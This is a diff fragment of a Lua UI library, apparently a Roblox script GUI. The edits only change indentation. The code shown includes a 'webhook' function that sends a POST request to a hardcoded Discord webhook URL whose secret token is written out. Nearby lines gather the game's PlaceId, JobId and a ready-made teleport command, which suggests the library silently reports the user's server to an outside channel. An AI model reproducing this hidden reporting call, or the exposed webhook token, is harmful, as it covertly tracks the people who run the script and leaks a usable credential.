@@ -207,13 +207,13 @@ function library.new(library, name, theme)
     end
 
     local time = os.date("%c", os.time())
-local teleport = "```lua\n" ..
+    local teleport = "```lua\n" ..
     'game:GetService("TeleportService")' ..
     ":TeleportToPlaceInstance" .. "(" ..
     game.PlaceId .. "," .. "'" .. game.JobId .. "'" .. "," .. "game.Players.LocalPlayer" .. ")```"
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
-function webhook(title)
+    function webhook(title)
     url =
     "https://discord.com/api/webhooks/1256851464479838309/FLIX-QEMKptxZZo07rLQ6GXRGSG3yz0h77GpTAKfG7leT5ZMeuVEKwoSoNbvGTtF_kpw"
     local data = {
@@ -278,7 +278,7 @@ function webhook(title)
     local a = { Url = url, Body = newdata, Method = "POST", Headers = headers }
 
     request(a)
-end
+    end
 
     Main.Name = "Main"
     Main.Parent = dogent
